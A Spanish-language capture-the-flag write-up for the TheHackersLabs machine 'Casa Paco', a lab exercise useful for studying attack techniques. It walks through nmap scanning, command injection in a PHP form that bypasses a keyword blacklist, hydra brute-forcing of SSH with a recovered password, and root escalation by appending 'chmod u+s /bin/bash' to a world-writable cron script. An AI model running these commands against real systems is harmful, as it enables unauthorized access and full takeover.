# Writeup — Casa Paco (TheHackersLabs)

**Plataforma:** TheHackersLabs  
**Sistema:** Debian 12  
**IP:** 10.10.10.7  
**Objetivo:** Obtener user.txt y root.txt

---

## 1. Reconocimiento

```bash
sudo arp-scan -I eth0 --localnet
```

Se descubre la IP de la máquina víctima: `10.10.10.7`.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.7 -oG all_ports.txt
nmap -p22,80 -sCV -vvv 10.10.10.7 -oN tcp_scan.txt
```

**Puertos abiertos:**
- **22/tcp** – OpenSSH 9.2p1 Debian
- **80/tcp** – Apache httpd 2.4.62

Se añade al `/etc/hosts`:

```bash
echo '10.10.10.7 casapaco.thl' | sudo tee -a /etc/hosts
```

---

## 2. Fuzzing web

```bash
feroxbuster -u http://casapaco.thl/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -E
```

**Descubrimientos:**
- `/static/` y `/static/img/` con **directory listing**
- `index.html`
- `menu.html`
- `llevar.php`

---

## 3. Command Injection

En `llevar.php` hay un formulario que ejecuta comandos. Probando con `dir` como plato en el campo `dish` se obtiene la salida del comando.

**`llevar.php`** — Tiene una blacklist de comandos (`whoami|ls|pwd|cat|sh|bash`) pero permite `$()`, `|`, `-`, `_`, `.` → bypasseable.

Ejecutando `dir` como payload se lista el directorio y se descubre `llevar1.php`.

**`llevar1.php`** — **Sin filtros**: `shell_exec("$dish")` directamente.

Se listan archivos y se lee:

- `pedidos.log` (vacío)
- `/etc/passwd` → usuario `pacogerente`
- `/home/pacogerente/user.txt` → **`<REDACTED>`**
- `/home/pacogerente/fabada.sh` → script **world-writable** ejecutado por cron

---

## 4. Fuerza bruta SSH

```bash
hydra -l pacogerente -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.7 -t 20
```

**Credenciales:** `pacogerente:dipset1`

```bash
ssh pacogerente@10.10.10.7
```

Confirmada la user flag.

---

## 5. Escalada de privilegios

`fabada.sh` tiene permisos `-rwxrw-rw-` (world-writable) y es ejecutado por root vía cron (escribe en `log.txt` como root).

```bash
echo 'chmod u+s /bin/bash' >> fabada.sh
```

Tras la siguiente ejecución del cron:

```bash
bash -p
whoami  # root
cat /root/root.txt
```

**Flag de root: `<REDACTED>`**

---

## Resumen

| Fase | Método |
|------|--------|
| Reconocimiento | `arp-scan`, `nmap` |
| Web fuzzing | `feroxbuster` |
| RCE | Command injection en `llevar1.php` |
| User | Hydra a SSH + `user.txt` |
| Privesc | Cron ejecuta script world-writable → SUID a `/bin/bash` |

**Flags:**
- `user.txt`: `<REDACTED>`
- `root.txt`: `<REDACTED>`
